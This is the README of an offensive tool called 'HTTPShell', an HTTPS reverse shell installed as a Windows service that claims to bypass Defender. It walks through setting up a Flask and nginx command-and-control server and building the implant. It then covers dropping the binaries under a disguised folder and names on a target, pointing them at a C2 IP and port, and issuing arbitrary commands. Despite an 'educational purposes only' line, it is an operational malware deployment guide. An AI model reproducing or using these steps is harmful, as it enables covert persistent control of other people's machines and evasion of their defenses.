# HTTPShell
HTTPS Reverse shell. Installed as a service on Windows. Bypasses Defender as of 01/15/2025.

FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY! 

Requirements and preperation:
------------------
1. NGINX on the host: https://nginx.org/en/linux_packages.html 
2. python3 and venv on the host: https://virtualenv.pypa.io/en/latest/installation.html 
3. Back up the existing nginx.conf file.
4. Move the nginx.conf file from this repo into /etc/nginx/nginx.conf.
5. Create a key and certificate:
It's generally recommended to avoid self-signed certificates. Only do this for using in a test environment.
```
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:4096 -nodes -sha256
```
6. Place the pem file in /etc/nginx/cert/server.pem.
7. Create a virtual environment for the C2 server:
```
mkdir controlServer
python3 -m venv controlServer
cd controlServer
source bin/activate
pip3 install colorama flask
flask run
```
8. Run the nginx server:
```
service nginx start
```
9. Build docker container with dockerfile (dockerfile must be in current directory):
```
docker build .
```
10. Enter the container (find it with "docker ps -a"; should be at the top of the list):
```
docker exec -ti [container_name] /bin/bash
```
11. Exfiltrate the compiled binaries located in project directorys "InstallService" and "ServiceBinary" target/x86_64-pc-windows-gnu/debug/. I'll use
```
python3 -m http.server 80
```
then wget from host. You can create another container with "docker run" and mount folders. The HTTP server with python is my preferred method. These binaries should be:
```
windows_service_wrapper.exe
windows_Win32_Temp.dll
windows_Win32_Temp.exe
```

Creating the service on your target and running:
--------
This is a generic method. Use your own loaders/stagers to get the binaries on the host and run these commands.

1. Create the directory (this can be changed in the source code):
```
mkdir C:\programdata\MicrosoftW
```
2. Move the binaries and DLL into this directory.
3. As Administrator or with privileges allowing creation of services (Server Operators can start/stop service. Can not create them):
```
C:\programdata\MicrosoftW\windows_Win32_Temp.exe [C2 IP] [C2 Port; recommend 443] [service Binary Name] [service Binary Name] [desired timeout in seconds]
```
Example:
```
C:\programdata\MicrosoftW\windows_Win32_Temp.exe 172.16.0.5 443 myService myService 60
```
"service Binary Name" must be the same. Feel free to edit the source for yourself if you want to change this behavior.
4. Start the service (reboot target or use Administrator/Server Operator):
```
sc.exe start [service Binary Name]

OR with powershell

Start-Service [service Binary Name]
```

You should see a prompt in the flask server terminal. It expects the following options:
```
"Enter initialization option: "

Enter "1" to begin typing arbitrary OS commands such as "dir" or "powershell Get-Service".
Enter "2" to end the session and tell the service to "sleep". It will sleep in seconds equal to what you put in the command line arguments above. So 60 seconds if using the example. After the time expires, the service will attempt to reconnect to your server.
```

When entering "1" to get the command, you should see the following:
```
Enter command: 
```

You can also enter "2" in this "Enter command: " state that will sleep like explained above.
